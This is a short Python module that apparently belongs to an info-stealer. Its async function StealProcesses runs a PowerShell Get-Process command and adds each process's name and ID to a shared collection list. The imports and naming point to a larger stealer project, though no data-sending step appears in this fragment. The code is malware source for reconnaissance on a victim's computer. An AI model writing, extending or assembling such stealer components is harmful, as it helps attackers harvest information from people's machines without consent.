import json

from main import ListFonction
from main import error_handler
from computer import get_commands


async def StealProcesses() -> None:
    try:
        output = await get_commands("powershell.exe Get-Process | Select-Object -Property Name, Id | ConvertTo-Json")
        processes_list = json.loads(output)
        ListFonction.Processes.extend([f"Name: {process['Name']}, Id: {process['Id']}" for process in processes_list])
    except Exception as e:
        error_handler(f"processes error - {str(e)}")
